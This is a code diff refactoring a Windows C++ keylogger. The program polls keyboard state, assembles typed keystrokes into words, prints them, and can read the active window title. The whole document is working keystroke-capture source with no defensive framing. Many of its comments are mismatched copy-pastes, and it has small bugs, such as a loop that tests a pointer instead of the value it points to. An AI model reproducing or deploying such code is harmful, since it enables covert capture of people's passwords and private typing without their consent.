@@ -10,8 +10,9 @@
 #include <atlstr.h>
 #include <locale>
 #include <codecvt>
-
-
+/*
+* Return the current pressed key or null
+*/
 bool IsSpecialKey(int S_Key) {
     switch (S_Key)
     {
@@ -26,42 +27,60 @@ bool IsSpecialKey(int S_Key) {
             return false;
     }
 }
-
+/*
+* Infinite while loop.
+*/
+class Looper {
+    /*
+    * Return the current pressed key or null
+    */
+    public: static void DoWhile(int sleep, bool* keepDoing, void(*callback)())
+    {
+        while (keepDoing) {
+            Sleep(sleep);
+            callback();
+        }
+    }
+};
 /*
 * Return the current pressed key or null
 */
 class KeyLogger {
     /*
     * All the words written by the user.
+    * public: static std::vector<std::string> words;
     */
-    // public: static std::vector<std::string> words;
     /*
     * Start the KeyLogger loop.
     */
-public: static void start(void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
+    public: static void Start(void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
     {
         std::string word;
         while (true) {
             Sleep(10);
-            char character = KeyLogger::catchChar();
-            if (isWordEnder((int) character)) {
-                wordCallback(word);
-                word = "";
-                continue;
-            }
-            if (character != NULL) {
-                if ((int)character == VK_BACK) word.pop_back();
-                else {
-                    word = word + character;
-                    charCallback(character);
-                }
-            }
+            char character = KeyLogger::CatchChar();
+            if (character == NULL) continue;
+            word = KeyLogger::BuildWord(character, word, wordCallback);
+            charCallback(character);
         }
     }
     /*
     * Return the current pressed key or null
     */
-    public: static bool isWordEnder(int character)
+    public: static std::string BuildWord(char character, std::string word, const std::function<void(std::string)>& callback)
+    {
+        if (character == NULL) return word;
+        if (IsWordEnder((int)character)) {
+            callback(word);
+            return "";
+        }
+        if ((int)character == VK_BACK) word.pop_back();
+        return word + character;
+    }
+    /*
+    * Return the current pressed key or null
+    */
+    public: static bool IsWordEnder(int character)
     {
         switch (character)
         {
@@ -80,7 +99,7 @@ public: static void start(void(*charCallback)(char), const std::function<void(st
     /*
     * Return the current pressed key or null
     */
-    public: static char catchChar()
+    public: static char CatchChar()
     {
         char KEY = 'x';
         for (int KEY = 8; KEY <= 190; KEY++)
@@ -92,35 +111,21 @@ public: static void start(void(*charCallback)(char), const std::function<void(st
     /*
     * Return the current pressed key or null
     */
-    public: static void forEachChar(void(*callback)(char))
+    public: static void ForEachChar(void(*callback)(char))
     {
-        KeyLogger::start(callback, [](std::string s) {});
+        KeyLogger::Start(callback, [](std::string s) {});
     }
     /*
     * Return the current pressed key or null
     */
-    public: static void forEachWord(const std::function<void(std::string)>& callback)
+    public: static void ForEachWord(const std::function<void(std::string)>& callback)
     {
-        KeyLogger::start([](char c){}, callback);
+        KeyLogger::Start([](char c){}, callback);
     }
 };
-
-std::wstring s2ws(const std::string& str)
-{
-    using convert_typeX = std::codecvt_utf8<wchar_t>;
-    std::wstring_convert<convert_typeX, wchar_t> converterX;
-
-    return converterX.from_bytes(str);
-}
-
-std::string ws2s(const std::wstring& wstr)
-{
-    using convert_typeX = std::codecvt_utf8<wchar_t>;
-    std::wstring_convert<convert_typeX, wchar_t> converterX;
-    return converterX.to_bytes(wstr);
-}
-
-
+/*
+* Return the current pressed key or null
+*/
 std::string GetActiveWindowTitle()
 {
     //LPSTR wnd_title;
@@ -133,10 +138,15 @@ std::string GetActiveWindowTitle()
 
 int main()
 {
+    //bool monitor = true;
+    //bool delay = 50; // 50 ms
+    //Looper::DoWhile(delay, &monitor, []() {
+    //    KeyLogger::ForEachWord();
+    //})
     std::vector<std::string> words;
-    std::cout << GetActiveWindowTitle();
+    //std::cout << GetActiveWindowTitle();
     // for (const auto& value: words) std::cout << value + char(VK_SPACE);
-    KeyLogger::forEachWord([&words](std::string word) {
+    KeyLogger::ForEachWord([&words](std::string word) {
         words.push_back(word);
         std::cout << word ;
     });
